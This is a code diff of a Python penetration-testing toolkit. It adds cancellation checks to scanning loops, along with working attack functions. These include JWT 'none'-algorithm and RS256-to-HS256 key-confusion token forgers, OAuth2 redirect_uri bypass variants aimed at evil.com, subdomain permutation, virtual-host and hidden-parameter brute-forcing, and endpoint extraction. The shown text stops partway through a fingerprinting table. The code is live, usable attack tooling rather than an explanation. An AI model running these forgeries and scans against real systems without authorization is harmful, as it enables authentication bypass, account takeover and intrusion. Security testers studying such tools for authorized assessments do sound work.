@@ -358,12 +358,19 @@ def find_subdomains(domain: str, threads: int, log: Logger) -> list[tuple[str, s
     log(f"[*] Brute-forcing {len(COMMON_SUBDOMAINS)} subdomains of {domain}", "cyan")
     found: list[tuple[str, str]] = []
     with ThreadPoolExecutor(max_workers=threads) as pool:
-        for result in (f.result() for f in as_completed(pool.submit(check, s) for s in COMMON_SUBDOMAINS)):
+        futures = [pool.submit(check, s) for s in COMMON_SUBDOMAINS]
+        for f in as_completed(futures):
+            if _should_stop():
+                for pending in futures:
+                    pending.cancel()
+                break
+            result = f.result()
             if result:
                 found.append(result)
                 log(f"[+] {result[0]}.{domain} -> {result[1]}", "ok")
     if not found:
         log("[!] No subdomains found", "warn")
+    session_set("last_subdomains", found)
     return sorted(found)
 
 
@@ -474,11 +481,19 @@ def buster(url: str, paths: list[str], threads: int, log: Logger) -> list[tuple[
 
     log(f"[*] Busting {url} with {len(paths)} paths  threads={threads}", "cyan")
     with ThreadPoolExecutor(max_workers=threads) as pool:
-        for result in (f.result() for f in as_completed(pool.submit(check, p) for p in paths)):
+        futures = [pool.submit(check, p) for p in paths]
+        for f in as_completed(futures):
+            if _should_stop():
+                for pending in futures:
+                    pending.cancel()
+                break
+            result = f.result()
             if result:
                 found.append(result)
                 log(f"[+] {result[0]}  {result[1]}", "ok")
+    sess.close()
     log(f"[*] Discovered {len(found)} endpoint(s)", "cyan")
+    session_set("last_buster_paths", [path for _, path in found])
     return sorted(found)
 
 
@@ -583,6 +598,8 @@ def sqli_detect(url: str, log: Logger) -> list[tuple[str, str, str]]:
     sess.headers.update({"User-Agent": "PENETRATOR/1.0"})
     findings: list[tuple[str, str, str]] = []
     for param in params:
+        if _should_stop():
+            break
         log(f"[*] Testing parameter: {param}", "cyan")
         for payload in SQL_PAYLOADS:
             mutated = dict(params); mutated[param] = params[param] + payload
@@ -631,6 +648,8 @@ def xss_reflected(url: str, log: Logger) -> list[tuple[str, str]]:
     findings: list[tuple[str, str]] = []
     marker = "penetx1337"
     for param in params:
+        if _should_stop():
+            break
         log(f"[*] Testing parameter: {param}", "cyan")
         for payload in XSS_PAYLOADS_BASIC:
             marked = payload.replace("alert(1)", f"alert('{marker}')")
@@ -1173,6 +1192,8 @@ def scan_with_banners(target: str, start: int, end: int, threads: int,
     log("[*] Grabbing banners...", "cyan")
     banners: dict[int, str] = {}
     for p in open_ports:
+        if _should_stop():
+            break
         banners[p] = grab_banner(target, p, timeout * 2, log)
     return banners
 
@@ -1811,26 +1832,31 @@ def http_smuggling_detect(url: str, log: Logger) -> dict:
         if _should_stop():
             break
         try:
-            sock = _socket.create_connection((host, port), timeout=10)
-            if parsed.scheme == "https":
-                ctx = ssl.create_default_context()
-                ctx.check_hostname = False
-                ctx.verify_mode = ssl.CERT_NONE
-                sock = ctx.wrap_socket(sock, server_hostname=host)
-            sock.sendall(payload.encode())
-            sock.settimeout(8)
-            data = b""
+            raw_sock = _socket.create_connection((host, port), timeout=10)
+            sock = raw_sock
             try:
-                while True:
-                    chunk = sock.recv(4096)
-                    if not chunk:
-                        break
-                    data += chunk
-                    if len(data) > 16384:
-                        break
-            except (TimeoutError, _socket.timeout):
-                pass
-            sock.close()
+                if parsed.scheme == "https":
+                    ctx = ssl.create_default_context()
+                    ctx.check_hostname = False
+                    ctx.verify_mode = ssl.CERT_NONE
+                    sock = ctx.wrap_socket(raw_sock, server_hostname=host)
+                sock.sendall(payload.encode())
+                sock.settimeout(8)
+                data = b""
+                try:
+                    while True:
+                        chunk = sock.recv(4096)
+                        if not chunk:
+                            break
+                        data += chunk
+                        if len(data) > 16384:
+                            break
+                except (TimeoutError, _socket.timeout):
+                    pass
+            finally:
+                sock.close()
+                if sock is not raw_sock:
+                    raw_sock.close()
         except OSError as exc:
             log(f"  {name}: connection error {exc}", "muted")
             findings["results"].append({"variant": name, "error": str(exc)})
@@ -4113,6 +4139,51 @@ def attack_chain(target: str, chain: list[str], log: Logger) -> dict:
             elif step == "swagger":
                 url = f"http://{target}"
                 results["outputs"]["swagger"] = swagger_discovery(url, log)
+            # Phase 11 aliases — map profile step names to functions
+            elif step in ("tech_fingerprint", "tech_fp"):
+                url = f"http://{target}"
+                results["outputs"]["tech_fingerprint"] = tech_fingerprint(url, log)
+            elif step in ("header_check", "security_headers"):
+                url = f"http://{target}"
+                results["outputs"]["header_check"] = check_security_headers(url, log)
+            elif step in ("subdomain_find", "subdomains"):
+                results["outputs"]["subdomain_find"] = find_subdomains(target, 50, log)
+            elif step in ("tls_scan", "tls_check"):
+                results["outputs"]["tls_scan"] = tls_scan(target, 443, log)
+            elif step in ("cookie_audit", "cookies"):
+                url = f"http://{target}"
+                results["outputs"]["cookie_audit"] = cookie_audit(url, log)
+            elif step in ("csrf_analyze", "csrf"):
+                url = f"http://{target}"
+                results["outputs"]["csrf_analyze"] = csrf_analyze(url, log)
+            elif step in ("open_redirect", "redirect"):
+                url = f"http://{target}"
+                results["outputs"]["open_redirect"] = open_redirect_test(url, log)
+            elif step in ("waf_detect", "waf_check"):
+                url = f"http://{target}"
+                results["outputs"]["waf_detect"] = waf_detect(url, log)
+            elif step in ("ssti_scan", "ssti"):
+                url = f"http://{target}"
+                results["outputs"]["ssti_scan"] = ssti_scan(url, "q", log)
+            elif step in ("xss_probe", "xss"):
+                url = f"http://{target}"
+                results["outputs"]["xss_probe"] = xss_reflected(url, log)
+            elif step in ("lfi_scan", "lfi"):
+                url = f"http://{target}"
+                results["outputs"]["lfi_scan"] = lfi_scan(url, "page", log)
+            elif step in ("ssrf_scan", "ssrf"):
+                url = f"http://{target}"
+                results["outputs"]["ssrf_scan"] = ssrf_scan(url, "url", log)
+            elif step in ("js_endpoint_extract", "js_extract"):
+                url = f"http://{target}"
+                results["outputs"]["js_endpoint_extract"] = js_endpoint_extract(url, log)
+            elif step in ("whois_lookup", "whois"):
+                results["outputs"]["whois_lookup"] = whois_lookup(target, log)
+            elif step in ("subdomain_perm", "altdns"):
+                results["outputs"]["subdomain_perm"] = subdomain_permutation(target, log)
+            elif step in ("cors_test", "cors_check"):
+                url = f"http://{target}"
+                results["outputs"]["cors_test"] = cors_test(url, log)
             else:
                 log(f"  Unknown step: {step}", "warn")
         except Exception as exc:
@@ -5533,15 +5604,18 @@ OWASP_2021 = {
 
 FINDING_TO_OWASP = {
     "sqli": "A03", "xss": "A03", "lfi": "A03", "command_injection": "A03",
-    "xxe": "A03", "crlf": "A03",
-    "ssrf": "A10",
+    "xxe": "A03", "crlf": "A03", "ssti": "A03", "prototype_pollution": "A03",
+    "ssrf": "A10", "dns_rebinding": "A10",
     "cors": "A01", "broken_auth": "A01", "idor": "A01", "mass_assignment": "A01",
-    "open_redirect": "A01",
+    "open_redirect": "A01", "csrf": "A01",
     "weak_tls": "A02", "weak_cipher": "A02", "weak_key": "A02",
+    "jwt_none": "A02", "jwt_confusion": "A02",
     "git_exposed": "A05", "swagger_exposed": "A05", "default_creds": "A05",
     "missing_headers": "A05", "firebase_open": "A05",
+    "http_smuggling": "A05", "cookie_insecure": "A05",
     "outdated_software": "A06",
     "race_condition": "A04",
+    "deserialization": "A08",
     "no_rate_limit": "A07",
     "no_logging": "A09",
 }
@@ -5727,3 +5801,1343 @@ def cis_benchmark(platform: str, log: Logger) -> dict:
     log(f"\n  CIS Score: {results['pass']}/{total} checks passed",
         "ok" if results["fail"] == 0 else "warn")
     return results
+
+
+# ===================================================================
+#  PHASE 11 — Advanced Tools, Database, CVSS, Profiles, SARIF
+# ===================================================================
+
+# ---------------------------------------------------------------------------
+# 31. JWT None-Algorithm Attack
+# ---------------------------------------------------------------------------
+def jwt_none_attack(token: str, log: Logger) -> dict:
+    """Test if a JWT accepts the 'none' algorithm (CVE-2015-9235)."""
+    import json as _json
+    log("[*] JWT 'none' algorithm attack", "cyan")
+    result: dict = {"forged": False, "original": token, "forged_tokens": []}
+
+    parts = token.split(".")
+    if len(parts) != 3:
+        log("[-] Invalid JWT format", "err")
+        return result
+
+    def _b64u_decode(s: str) -> bytes:
+        s += "=" * ((4 - len(s) % 4) % 4)
+        return base64.urlsafe_b64decode(s)
+
+    def _b64u_encode(b: bytes) -> str:
+        return base64.urlsafe_b64encode(b).decode().rstrip("=")
+
+    try:
+        header = _json.loads(_b64u_decode(parts[0]))
+    except Exception:
+        log("[-] Cannot decode JWT header", "err")
+        return result
+
+    log(f"  Original alg: {header.get('alg', '?')}", "info")
+
+    # Forge tokens with none/None/NONE/nOnE and empty signature
+    for alg in ("none", "None", "NONE", "nOnE"):
+        forged_header = dict(header)
+        forged_header["alg"] = alg
+        new_header = _b64u_encode(_json.dumps(forged_header, separators=(",", ":")).encode())
+        forged = f"{new_header}.{parts[1]}."
+        result["forged_tokens"].append({"alg": alg, "token": forged})
+        log(f"  Forged (alg={alg}): {forged[:60]}...", "warn")
+
+    # Also try with original signature kept
+    forged_header = dict(header)
+    forged_header["alg"] = "none"
+    new_header = _b64u_encode(_json.dumps(forged_header, separators=(",", ":")).encode())
+    result["forged_tokens"].append({
+        "alg": "none+sig",
+        "token": f"{new_header}.{parts[1]}.{parts[2]}",
+    })
+
+    result["forged"] = True  # Tokens are generated; actual vulnerability requires server-side verification
+    log("[!] Forged tokens generated — test these against the target API", "warn")
+    log("  If any are accepted, the server is VULNERABLE to alg:none", "err")
+    session_set("last_jwt_none_result", result)
+    return result
+
+
+# ---------------------------------------------------------------------------
+# 32. JWT Key Confusion (RS256 → HS256)
+# ---------------------------------------------------------------------------
+def jwt_key_confusion(token: str, public_key: str, log: Logger) -> dict:
+    """Attempt RS256→HS256 key confusion attack."""
+    import hmac as _hmac
+    import json as _json
+    log("[*] JWT key confusion attack (RS256→HS256)", "cyan")
+    result: dict = {"forged": False, "original": token, "forged_token": ""}
+
+    parts = token.split(".")
+    if len(parts) != 3:
+        log("[-] Invalid JWT format", "err")
+        return result
+
+    def _b64u_encode(b: bytes) -> str:
+        return base64.urlsafe_b64encode(b).decode().rstrip("=")
+
+    def _b64u_decode(s: str) -> bytes:
+        s += "=" * ((4 - len(s) % 4) % 4)
+        return base64.urlsafe_b64decode(s)
+
+    try:
+        header = _json.loads(_b64u_decode(parts[0]))
+    except Exception:
+        log("[-] Cannot decode header", "err")
+        return result
+
+    if header.get("alg") not in ("RS256", "RS384", "RS512"):
+        log(f"[-] Original alg is {header.get('alg')}, not RS*", "warn")
+
+    # Forge with HS256 using public key as HMAC secret
+    forged_header = {"alg": "HS256", "typ": "JWT"}
+    new_header = _b64u_encode(_json.dumps(forged_header, separators=(",", ":")).encode())
+    signing_input = f"{new_header}.{parts[1]}".encode()
+
+    # Try PEM key as-is
+    key_bytes = public_key.encode() if isinstance(public_key, str) else public_key
+    sig = _hmac.new(key_bytes, signing_input, "sha256").digest()
+    forged = f"{new_header}.{parts[1]}.{_b64u_encode(sig)}"
+
+    result["forged_token"] = forged
+    result["forged"] = True  # Token forged; actual vulnerability requires server-side verification
+    log(f"  Forged token (HS256 with public key): {forged[:60]}...", "warn")
+    log("[!] Test this token against the API — if accepted, server is VULNERABLE", "err")
+    session_set("last_jwt_confusion_result", result)
+    return result
+
+
+# ---------------------------------------------------------------------------
+# 33. CSRF Token Analyzer
+# ---------------------------------------------------------------------------
+def csrf_analyze(url: str, log: Logger) -> dict:
+    """Analyze CSRF protections on a web form."""
+    import requests
+    log(f"[*] CSRF analysis: {url}", "cyan")
+    result: dict = {"url": url, "tokens_found": [], "issues": [], "score": 100}
+
+    try:
+        resp = requests.get(url, timeout=15, verify=False,
+                            headers={"User-Agent": random_ua()},
+                            allow_redirects=True)
+    except requests.RequestException as exc:
+        log(f"[-] {exc}", "err")
+        return result
+
+    body = resp.text.lower()
+
+    # Check for CSRF tokens in forms
+    csrf_names = ("csrf", "_token", "authenticity_token", "xsrf", "__requestverificationtoken",
+                  "csrfmiddlewaretoken", "_csrf_token", "anti-forgery")
+    found_tokens = []
+    for name in csrf_names:
+        if name in body:
+            found_tokens.append(name)
+    result["tokens_found"] = found_tokens
+
+    if not found_tokens:
+        result["issues"].append("No CSRF token found in forms")
+        result["score"] -= 40
+        log("[!] No CSRF token found — forms may be vulnerable", "err")
+    else:
+        log(f"[+] CSRF token(s) found: {', '.join(found_tokens)}", "ok")
+
+    # Check SameSite cookie attribute
+    samesite_ok = False
+    # Use raw headers — Set-Cookie should NOT be split on comma
+    # because Expires values contain commas (e.g. "Thu, 01 Jan 2025")
+    raw_set_cookies = resp.raw.headers.getlist("Set-Cookie") if hasattr(resp.raw.headers, "getlist") else []
+    if not raw_set_cookies:
+        # Fallback: split only on comma-space-uppercase (new cookie start)
+        raw_val = resp.headers.get("Set-Cookie", "")
+        if raw_val:
+            import re as _re
+            raw_set_cookies = _re.split(r",\s*(?=[A-Za-z_][\w]*=)", raw_val)
+    for cookie_hdr in raw_set_cookies:
+        if "samesite" in cookie_hdr.lower():
+            if "strict" in cookie_hdr.lower() or "lax" in cookie_hdr.lower():
+                samesite_ok = True
+
+    if not samesite_ok:
+        result["issues"].append("No SameSite cookie attribute")
+        result["score"] -= 20
+        log("[!] No SameSite cookie attribute set", "warn")
+    else:
+        log("[+] SameSite cookie attribute present", "ok")
+
+    # Check for custom headers requirement (X-Requested-With, etc.)
+    # Try request without standard AJAX header
+    try:
+        resp2 = requests.post(url, timeout=10, verify=False, data={},
+                              headers={"User-Agent": random_ua()})
+        if resp2.status_code not in (403, 401, 405):
+            result["issues"].append("POST accepted without CSRF header/token")
+            result["score"] -= 20
+    except requests.RequestException:
+        pass
+
+    result["score"] = max(0, result["score"])
+    tag = "ok" if result["score"] >= 80 else ("warn" if result["score"] >= 50 else "err")
+    log(f"  CSRF protection score: {result['score']}/100", tag)
+    session_set("last_csrf_result", result)
+    return result
+
+
+# ---------------------------------------------------------------------------
+# 34. Cookie Security Audit
+# ---------------------------------------------------------------------------
+def cookie_audit(url: str, log: Logger) -> dict:
+    """Audit cookie security attributes (Secure, HttpOnly, SameSite, etc.)."""
+    import requests
+    log(f"[*] Cookie security audit: {url}", "cyan")
+    result: dict = {"url": url, "cookies": [], "issues": []}
+
+    try:
+        resp = requests.get(url, timeout=15, verify=False,
+                            headers={"User-Agent": random_ua()},
+                            allow_redirects=True)
+    except requests.RequestException as exc:
+        log(f"[-] {exc}", "err")
+        return result
+
+    if not resp.cookies and "set-cookie" not in {k.lower() for k in resp.headers}:
+        log("[-] No cookies set by this URL", "muted")
+        return result
+
+    # Parse Set-Cookie headers for full attribute visibility
+    # Use raw headers to avoid comma-splitting Expires dates
+    raw_set_cookies = resp.raw.headers.getlist("Set-Cookie") if hasattr(resp.raw.headers, "getlist") else []
+    if not raw_set_cookies:
+        raw_val = resp.headers.get("Set-Cookie", "")
+        if raw_val:
+            import re as _re
+            raw_set_cookies = _re.split(r",\s*(?=[A-Za-z_][\w]*=)", raw_val)
+    for hdr_val in raw_set_cookies:
+        if not hdr_val:
+            continue
+        parts = [p.strip() for p in hdr_val.split(";")]
+        if not parts:
+            continue
+        name_val = parts[0]
+        name = name_val.split("=", 1)[0] if "=" in name_val else name_val
+        attrs_lower = " ".join(parts[1:]).lower()
+
+        cookie_info: dict = {
+            "name": name,
+            "secure": "secure" in attrs_lower,
+            "httponly": "httponly" in attrs_lower,
+            "samesite": "missing",
+            "has_expiry": "expires" in attrs_lower or "max-age" in attrs_lower,
+        }
+        if "samesite=strict" in attrs_lower:
+            cookie_info["samesite"] = "strict"
+        elif "samesite=lax" in attrs_lower:
+            cookie_info["samesite"] = "lax"
+        elif "samesite=none" in attrs_lower:
+            cookie_info["samesite"] = "none"
+
+        issues = []
+        if not cookie_info["secure"]:
+            issues.append("Missing Secure flag")
+        if not cookie_info["httponly"]:
+            issues.append("Missing HttpOnly flag")
+        if cookie_info["samesite"] == "missing":
+            issues.append("SameSite attribute missing")
+        elif cookie_info["samesite"] == "none" and not cookie_info["secure"]:
+            issues.append("SameSite=None without Secure flag")
+        if name.startswith("__Host-") and not cookie_info["secure"]:
+            issues.append("__Host- prefix requires Secure")
+        if name.startswith("__Secure-") and not cookie_info["secure"]:
+            issues.append("__Secure- prefix requires Secure")
+
+        cookie_info["issues"] = issues
+        result["cookies"].append(cookie_info)
+        result["issues"].extend(issues)
+
+        tag = "ok" if not issues else "warn"
+        log(f"  {name}: {'✓' if not issues else '✗'} {', '.join(issues) if issues else 'all flags OK'}", tag)
+
+    total = len(result["cookies"])
+    bad = sum(1 for c in result["cookies"] if c["issues"])
+    log(f"\n  {total} cookie(s), {total - bad} secure, {bad} with issues",
+        "ok" if bad == 0 else "warn")
+    session_set("last_cookie_audit", result)
+    return result
+
+
+# ---------------------------------------------------------------------------
+# 35. OAuth2 Flow Tester
+# ---------------------------------------------------------------------------
+def oauth2_test(auth_url: str, redirect_uri: str, log: Logger) -> dict:
+    """Test OAuth2 authorization endpoint for redirect_uri manipulation."""
+    import requests
+    from urllib.parse import urlparse, urlencode, parse_qs
+    log(f"[*] OAuth2 redirect_uri test: {auth_url}", "cyan")
+    result: dict = {"auth_url": auth_url, "tests": [], "issues": []}
+
+    parsed = urlparse(redirect_uri)
+    base_domain = parsed.netloc
+
+    # Generate manipulated redirect_uri variants
+    variants = [
+        ("Original", redirect_uri),
+        ("Evil subdomain", redirect_uri.replace(base_domain, f"evil.{base_domain}")),
+        ("Evil path", redirect_uri.rstrip("/") + ".evil.com"),
+        ("Open redirect", redirect_uri + "/../@evil.com"),
+        ("Param injection", redirect_uri + "?rd=https://evil.com"),
+        ("Fragment bypass", redirect_uri + "#@evil.com"),
+        ("URL encoding", redirect_uri.replace("://", "%3A%2F%2F")),
+        ("Null byte", redirect_uri + "%00.evil.com"),
+        ("Backslash", redirect_uri.replace("/", "\\")),
+        ("Double redirect", f"https://evil.com?url={urllib.parse.quote(redirect_uri)}"),
+    ]
+
+    for name, variant in variants:
+        if _should_stop():
+            break
+        test_url = auth_url
+        sep = "&" if "?" in auth_url else "?"
+        test_url += f"{sep}redirect_uri={urllib.parse.quote(variant, safe='')}"
+        try:
+            resp = requests.get(test_url, timeout=10, verify=False,
+                                allow_redirects=False,
+                                headers={"User-Agent": random_ua()})
+            status = resp.status_code
+            location = resp.headers.get("Location", "")
+            accepted = status in (301, 302, 303, 307, 308) and variant in location
+            test_result = {"name": name, "variant": variant[:80], "status": status,
+                           "accepted": accepted}
+            result["tests"].append(test_result)
+            if accepted:
+                result["issues"].append(f"Accepted: {name}")
+                log(f"  [!] {name}: ACCEPTED (status {status})", "err")
+            else:
+                log(f"  [+] {name}: rejected (status {status})", "ok")
+        except requests.RequestException as exc:
+            log(f"  [-] {name}: {exc}", "muted")
+            result["tests"].append({"name": name, "error": str(exc)})
+
+    if result["issues"]:
+        log(f"[!] {len(result['issues'])} redirect_uri bypass(es) found!", "err")
+    else:
+        log("[+] All redirect_uri variants properly rejected", "ok")
+    session_set("last_oauth2_result", result)
+    return result
+
+
+# ---------------------------------------------------------------------------
+# 36. Subdomain Permutation (altdns-style)
+# ---------------------------------------------------------------------------
+ALTDNS_WORDS = [
+    "dev", "staging", "stage", "stg", "test", "testing", "uat", "qa",
+    "preprod", "pre", "prod", "production", "api", "app", "admin",
+    "internal", "intranet", "vpn", "mail", "email", "mx", "portal",
+    "cdn", "media", "static", "assets", "img", "images", "docs",
+    "beta", "alpha", "demo", "sandbox", "lab", "old", "new", "legacy",
+    "backup", "bak", "temp", "tmp", "db", "database", "sql", "redis",
+    "cache", "search", "elastic", "kibana", "grafana", "monitor",
+    "jenkins", "ci", "cd", "git", "gitlab", "github", "bitbucket",
+    "docker", "k8s", "kube", "aws", "gcp", "azure", "cloud",
+    "auth", "sso", "login", "oauth", "iam", "ldap", "ftp", "sftp",
+    "ssh", "proxy", "gateway", "lb", "load", "web", "www", "www2",
+]
+
+
+def subdomain_permutation(domain: str, log: Logger) -> list[dict]:
+    """Generate and resolve altdns-style subdomain permutations."""
+    import socket as _socket
+    log(f"[*] Subdomain permutation scan: {domain}", "cyan")
+    results: list[dict] = []
+
+    parts = domain.split(".")
+    base = parts[0] if len(parts) > 1 else domain
+    rest = ".".join(parts[1:]) if len(parts) > 1 else "com"
+
+    # Generate permutations
+    candidates: set[str] = set()
+    for word in ALTDNS_WORDS:
+        candidates.add(f"{word}.{domain}")              # word.example.com
+        candidates.add(f"{word}-{base}.{rest}")          # word-sub.example.com
+        candidates.add(f"{base}-{word}.{rest}")          # sub-word.example.com
+        candidates.add(f"{word}{base}.{rest}")           # wordsub.example.com
+
+    # Remove the original domain itself
+    candidates.discard(domain)
+    log(f"  Generated {len(candidates)} candidates", "info")
+
+    resolved = 0
+    for candidate in sorted(candidates):
+        if _should_stop():
+            break
+        try:
+            ip = _socket.gethostbyname(candidate)
+            results.append({"subdomain": candidate, "ip": ip})
+            resolved += 1
+            log(f"[+] {candidate} → {ip}", "ok")
+        except _socket.gaierror:
+            pass
+
+    log(f"[*] {resolved}/{len(candidates)} permutations resolved", "cyan")
+    session_set("last_subdomain_perm", results)
+    return results
+
+
+# ---------------------------------------------------------------------------
+# 37. Virtual Host Discovery
+# ---------------------------------------------------------------------------
+def vhost_discover(ip: str, wordlist: list[str] | str, log: Logger) -> list[dict]:
+    """Discover virtual hosts by brute-forcing the Host header."""
+    import requests
+    log(f"[*] Virtual host discovery on {ip}", "cyan")
+    results: list[dict] = []
+
+    if isinstance(wordlist, str):
+        # Treat as comma/newline-separated or file path
+        path = Path(wordlist)
+        if path.is_file():
+            hosts = [l.strip() for l in path.read_text(encoding="utf-8", errors="replace").splitlines() if l.strip()]
+        else:
+            hosts = [h.strip() for h in wordlist.replace(",", "\n").split("\n") if h.strip()]
+    else:
+        hosts = list(wordlist)
+
+    if not hosts:
+        hosts = [f"{w}.{ip}" for w in ALTDNS_WORDS[:30]]
+        log(f"  Using default wordlist ({len(hosts)} entries)", "info")
+
+    # Get baseline response (random non-existent host)
+    baseline_len = 0
+    try:
+        resp = requests.get(f"http://{ip}", timeout=10, verify=False,
+                            headers={"Host": "nonexistent.invalid", "User-Agent": random_ua()})
+        baseline_len = len(resp.text)
+    except requests.RequestException:
+        pass
+
+    log(f"  Baseline response size: {baseline_len} bytes", "info")
+
+    for hostname in hosts:
+        if _should_stop():
+            break
+        try:
+            resp = requests.get(f"http://{ip}", timeout=8, verify=False,
+                                headers={"Host": hostname, "User-Agent": random_ua()})
+            resp_len = len(resp.text)
+            # Significant difference from baseline suggests a real vhost
+            if abs(resp_len - baseline_len) > 50 and resp.status_code != 404:
+                results.append({"hostname": hostname, "status": resp.status_code,
+                                "size": resp_len})
+                log(f"[+] {hostname} — {resp.status_code} ({resp_len} bytes)", "ok")
+        except requests.RequestException:
+            pass
+
+    if not results:
+        log("[+] No additional virtual hosts found", "muted")
+    else:
+        log(f"[*] {len(results)} virtual host(s) discovered", "cyan")
+    session_set("last_vhosts", results)
+    return results
+
+
+# ---------------------------------------------------------------------------
+# 38. JavaScript Endpoint Extractor
+# ---------------------------------------------------------------------------
+_JS_ENDPOINT_RE = re.compile(
+    r"""(?:"|'|`)((?:/api/|/v[0-9]+/|/graphql|/rest/|/auth/|/admin/)[\w/\-?&=.{}:]+)(?:"|'|`)""",
+)
+_JS_URL_RE = re.compile(
+    r"""(?:"|'|`)(https?://[^\s"'`<>]{5,200})(?:"|'|`)""",
+)
+
+
+def js_endpoint_extract(url: str, log: Logger) -> dict:
+    """Fetch JavaScript files from a page and extract API endpoints."""
+    import requests
+    log(f"[*] JS endpoint extraction: {url}", "cyan")
+    result: dict = {"url": url, "scripts": [], "endpoints": [], "full_urls": []}
+
+    try:
+        resp = requests.get(url, timeout=15, verify=False,
+                            headers={"User-Agent": random_ua()})
+    except requests.RequestException as exc:
+        log(f"[-] {exc}", "err")
+        return result
+
+    # Find <script src="..."> tags
+    script_srcs = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', resp.text, re.IGNORECASE)
+    # Also look for inline scripts
+    inline_scripts = re.findall(r'<script[^>]*>(.*?)</script>', resp.text, re.DOTALL | re.IGNORECASE)
+
+    all_js = "\n".join(inline_scripts)
+    result["scripts"] = script_srcs[:50]
+    log(f"  Found {len(script_srcs)} external scripts, {len(inline_scripts)} inline", "info")
+
+    # Fetch external scripts
+    from urllib.parse import urljoin
+    for src in script_srcs[:20]:
+        if _should_stop():
+            break
+        full_url = urljoin(url, src)
+        try:
+            js_resp = requests.get(full_url, timeout=10, verify=False,
+                                   headers={"User-Agent": random_ua()})
+            all_js += "\n" + js_resp.text
+        except requests.RequestException:
+            pass
+
+    # Extract endpoints
+    endpoints = set()
+    for match in _JS_ENDPOINT_RE.finditer(all_js):
+        endpoints.add(match.group(1))
+    for match in _JS_URL_RE.finditer(all_js):
+        result["full_urls"].append(match.group(1))
+
+    result["endpoints"] = sorted(endpoints)
+    result["full_urls"] = list(set(result["full_urls"]))[:100]
+
+    for ep in sorted(endpoints)[:30]:
+        log(f"  [+] {ep}", "ok")
+    if result["full_urls"]:
+        log(f"  Full URLs found: {len(result['full_urls'])}", "info")
+
+    log(f"[*] {len(endpoints)} API endpoint(s) extracted", "cyan")
+    session_set("last_js_endpoints", result)
+    return result
+
+
+# ---------------------------------------------------------------------------
+# 39. HTTP Parameter Discovery
+# ---------------------------------------------------------------------------
+COMMON_PARAMS = [
+    "id", "page", "q", "search", "query", "lang", "language", "redirect",
+    "url", "next", "return", "callback", "cb", "ref", "source", "target",
+    "file", "path", "dir", "debug", "test", "admin", "action", "cmd",
+    "exec", "command", "type", "format", "output", "mode", "view",
+    "template", "theme", "style", "config", "key", "token", "api_key",
+    "secret", "password", "user", "username", "email", "name", "sort",
+    "order", "limit", "offset", "category", "tag", "filter", "status",
+    "role", "access", "level", "version", "v", "include", "require",
+]
+
+
+def param_discovery(url: str, wordlist: list[str] | str | None, log: Logger) -> dict:
+    """Discover hidden HTTP GET/POST parameters."""
+    import requests
+    log(f"[*] Parameter discovery: {url}", "cyan")
+    result: dict = {"url": url, "found_get": [], "found_post": []}
+
+    # Parse wordlist
+    if wordlist and isinstance(wordlist, str):
+        path = Path(wordlist)
+        if path.is_file():
+            params = [l.strip() for l in path.read_text(encoding="utf-8", errors="replace").splitlines() if l.strip()]
+        else:
+            params = [p.strip() for p in wordlist.replace(",", "\n").split("\n") if p.strip()]
+    elif isinstance(wordlist, list):
+        params = wordlist
+    else:
+        params = COMMON_PARAMS
+
+    log(f"  Testing {len(params)} parameters", "info")
+
+    # Get baseline
+    try:
+        baseline = requests.get(url, timeout=10, verify=False,
+                                headers={"User-Agent": random_ua()})
+        baseline_size = len(baseline.text)
+        baseline_status = baseline.status_code
+    except requests.RequestException as exc:
+        log(f"[-] {exc}", "err")
+        return result
+
+    # Test GET parameters
+    for param in params:
+        if _should_stop():
+            break
+        sep = "&" if "?" in url else "?"
+        test_url = f"{url}{sep}{param}=FUZZ_PENETRATOR"
+        try:
+            resp = requests.get(test_url, timeout=8, verify=False,
+                                headers={"User-Agent": random_ua()})
+            size_diff = abs(len(resp.text) - baseline_size)
+            if size_diff > 50 or resp.status_code != baseline_status:
+                result["found_get"].append({
+                    "param": param, "status": resp.status_code,
+                    "size_diff": size_diff,
+                })
+                log(f"  [+] GET ?{param}= → {resp.status_code} (Δ{size_diff}b)", "ok")
+        except requests.RequestException:
+            pass
+
+    # Test POST parameters (quick subset)
+    for param in params[:20]:
+        if _should_stop():
+            break
+        try:
+            resp = requests.post(url, timeout=8, verify=False, data={param: "FUZZ"},
+                                 headers={"User-Agent": random_ua()})
+            size_diff = abs(len(resp.text) - baseline_size)
+            if size_diff > 50 or resp.status_code != baseline_status:
+                result["found_post"].append({
+                    "param": param, "status": resp.status_code,
+                    "size_diff": size_diff,
+                })
+                log(f"  [+] POST {param}= → {resp.status_code} (Δ{size_diff}b)", "ok")
+        except requests.RequestException:
+            pass
+
+    total = len(result["found_get"]) + len(result["found_post"])
+    log(f"[*] {total} hidden parameter(s) found", "cyan" if total else "muted")
+    session_set("last_param_discovery", result)
+    return result
+
+
+# ---------------------------------------------------------------------------
+# 40. Technology Fingerprinting (Wappalyzer-style)
+# ---------------------------------------------------------------------------
+TECH_SIGNATURES = {
+    # Headers
+    "headers": {
+        "x-powered-by": {
+            "PHP": r"PHP", "ASP.NET": r"ASP\.NET", "Express": r"Express",
+            "Next.js": r"Next\.js",
+        },
+        "server": {
+            "Nginx": r"nginx", "Apache": r"Apache", "IIS": r"Microsoft-IIS",
+            "LiteSpeed": r"LiteSpeed", "Caddy": r"Caddy", "Cloudflare": r"cloudflare",
+            "Gunicorn": r"gunicorn",
+        },
+        "x-generator": {
+            "WordPress": r"WordPress", "Drupal": r"Drupal", "Joomla": r"Joomla",
+            "Hugo": r"Hugo",
+        },
+    },
+    # HTML patterns
+    "html": {
+        "WordPress": r'wp-content|wp-includes|wp-json',
+        "Drupal": r'drupal\.js|Drupal\.settings|sites/default',
+        "Joomla": r'joomla|com_content',
+        "React": r'react\.production\.min\.js|_react[A-Z]|__NEXT_DATA__',
+        "Vue.js": r'vue\.min\.js|v-bind:|v-on:|v-if=',
+        "Angular": r'ng-version|angular\.min\.js|ng-app=',
+        "jQuery": r'jquery[\.-][\d]+\.[\d]+\.[\d]+\.(?:min\.)?js',
+        "Bootstrap": r'bootstrap\.min\.(css|js)',
+        "Tailwind": r'tailwindcss',
+        "Laravel": r'laravel_session|XSRF-TOKEN',
+        "Django": r'csrfmiddlewaretoken|djdt',
+        "Ruby on Rails": r'csrf-token.*authenticity_token|action_dispatch',
+        "Spring": r'jsessionid|spring',
+        "Shopify": r'cdn\.shopify\.com',
+        "Wix": r'wix\.com|static\.parastorage\.com',
+        "Squarespace": r'squarespace\.com|static1\.squarespace',
+    },
+    # Cookie names
+    "cookies": {
+        "PHP": "PHPSESSID",
+        "ASP.NET": "ASP.NET_SessionId",
